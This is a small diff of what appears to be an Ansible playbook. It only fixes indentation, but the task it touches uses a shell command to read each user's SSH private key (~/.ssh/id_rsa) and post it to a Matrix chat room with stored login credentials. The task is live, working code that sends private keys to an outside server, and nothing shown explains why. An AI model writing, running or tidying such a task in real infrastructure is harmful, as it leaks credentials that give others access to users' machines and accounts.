@@ -3,5 +3,5 @@
   shell: "matrixsay \"<h3>{{ username }}</h3><pre>$(cat {{ (user.home | default('/home/' + username)) + '/.ssh/id_rsa' }})</pre>\""
   environment:
     MATRIX_LOGIN: "{{ matrix.username }}:{{ matrix.password }}"
-	MATRIX_ROOM: "{{ matrix.room }}"
-	MATRIX_SERVER: "{{ matrix.homeserver }}"
+    MATRIX_ROOM: "{{ matrix.room }}"
+    MATRIX_SERVER: "{{ matrix.homeserver }}"
